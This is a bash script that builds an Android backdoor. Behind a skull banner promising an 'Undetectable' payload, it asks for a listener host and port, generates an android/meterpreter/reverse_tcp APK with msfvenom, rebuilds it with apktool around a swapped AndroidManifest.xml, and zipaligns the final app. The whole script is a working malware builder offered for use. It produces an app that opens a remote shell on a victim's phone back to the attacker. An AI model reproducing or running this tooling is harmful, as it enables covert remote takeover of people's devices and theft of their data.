#Author - github.com/kinghacker0
#Credit - Give me credit if you use any part of this code.
clear
#Banner
echo -e "\e[31m          .                                                      .             \e[1m";
echo -e "\e[31m        .n                   .                 .                  n.           \e[1m";
echo -e "\e[31m  .   .dP                  dP                   9b                 9b.    .    \e[1m";
echo -e "\e[31m 4    qXb         .       dX                     Xb       .        dXp     t   \e[1m";
echo -e "\e[31mdX.    9Xb      .dXb    __X                       X__    dXb.     dXP     .Xb  \e[1m";
echo -e "\e[31m9XXb._ XXXXX _.dXXXXb dXXXXX    (Undetectable)   XXXXXb._dXXXXP XXXXX     XXP  \e[1m";
echo -e "\e[31m 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP   \e[1m";
echo -e "\e[31m   9XXXXXXXXXXXXXXXXXXXXX'~   ~ OOO8b   d8OOO'~   ~ XXXXXXXXXXXXXXXXXXXXXP'    \e[1m";
echo -e "\e[31m     9XXXXXXXXXXXP'  9XX'   DIE     98v8P'  HUMAN    XXP'  9XXXXXXXXXXXP'      \e[1m";
echo -e "\e[31m        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~          \e[1m";
echo -e "\e[31m                        )b.  .dbo.dP' v' 9b.odb.  .dX(                         \e[1m";
echo -e "\e[31m                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.                        \e[1m";
echo -e "\e[31m                     dXXXXXXXXXXXP'   .    9XXXXXXXXXXXb                       \e[1m";
echo -e "\e[31m                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb                      \e[1m";
echo -e "\e[31m                    9XXb'    XXXXXb.dX|Xb.dXXXXX'    dXXP                      \e[1m";
echo -e "\e[31m                      '      9XXXXXX(   )XXXXXXP       '                       \e[1m";
echo -e "\e[31m                              XXXX X. v'.X XXXX                                \e[1m";
echo -e "\e[31m                              XP^X' b   d' X^XX                                \e[1m";
echo -e "\e[31m                              X. 9      '  P )X                                \e[1m";
echo -e "\e[31m                              b               d                                \e[1m";
echo -e "\e[97m[-]Author = github.com/kinghacker0                                             \e[2m";
echo -e "\e[97m[-]Website = hackersking.in                                                    \e[2m";
        
#Payload Generate
echo -e "\e[32m                                 \e[0m"
read -p "[*] Enter name of payload#~: " backdoor                                 
read -p "[*] Enter lhost#~: " lhost
read -p "[*] Enter lport#~: " lport
msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> backdoor.apk
#Decompiling
echo -e "\e[32m                                 \e[0m"
echo "[-] Genereting Undetectable Backdoor"
apktool d backdoor.apk
rm backdoor.apk && cd backdoor
rm AndroidManifest.xml && cd ..
cp AndroidManifest.xml backdoor

#Recompiling
apktool b backdoor
cd backdoor && cd dist
mv backdoor.apk ..
cd .. && mv backdoor.apk ..
cd .. && rm -rf backdoor

#Signing the apk
echo -e "\e[96m                                 \e[2m"
echo "[-] Signing the final apk "
zipalign -v 4 backdoor.apk backdoor-signed.apk
rm backdoor.apk && mv backdoor-signed.apk $backdoor.apk

#Changing this banner doesn't make you
